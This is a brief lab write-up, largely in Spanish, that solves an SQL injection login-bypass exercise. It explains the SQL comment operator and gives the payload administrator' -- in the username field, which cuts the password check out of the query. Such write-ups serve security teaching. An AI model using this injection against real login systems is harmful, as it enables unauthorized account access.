#Lab: SQL injection vulnerability allowing login bypass
```
This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user. 
```

```
Teoria:

En SQL, el operador de comentario -- permite ignorar el resto de la consulta.

SELECT * FROM users WHERE username = 'admin' -- comentario

Todo lo que aparece después de -- no se ejecuta.
En ataques de login bypass, el atacante introduce una inyección que permite anular la verificación de contraseña
```

```
Resolución:
El formulario de login envía el nombre de usuario y contraseña al servidor.

La aplicación genera una consulta SQL como: SELECT * FROM users  WHERE username = 'usuario' AND password = 'contraseña'

Introducimos el username : administrator' --
La contraseña ponemos cualquier cosa

La consulta quedaria asi:  SELECT * FROM users  WHERE username = 'administrator' --' AND password = '123'
```
